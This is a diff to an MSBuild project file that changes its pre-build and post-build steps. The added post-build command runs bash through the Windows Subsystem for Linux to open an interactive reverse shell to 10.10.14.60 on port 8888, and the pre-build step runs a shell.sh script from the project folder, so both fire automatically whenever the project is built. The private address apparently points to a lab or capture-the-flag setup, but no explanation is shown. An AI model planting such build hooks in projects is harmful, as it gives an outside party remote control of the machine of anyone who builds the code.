@@ -9,11 +9,11 @@
   </PropertyGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="%windir%\sysnative\bash.exe -c "/>
+    <Exec Command="%25windir%25\sysnative\bash.exe -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.60/8888 0&gt;&amp;1&quot;"/>
   </Target>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="%windir%\sysnative\bash.exe -c "`echo '$(ProjectDir)shell.sh' | sed -re 's/\\\\/\//g; s/([A-Z]):/\/mnt\/\L\1\E/i;'`"" />
+    <Exec Command="%25windir%25\sysnative\bash.exe -c "`echo '$(ProjectDir)shell.sh' | sed -re 's/\\\\/\//g; s/([A-Z]):/\/mnt\/\L\1\E/i;'`"" />
   </Target>
 
 </Project>
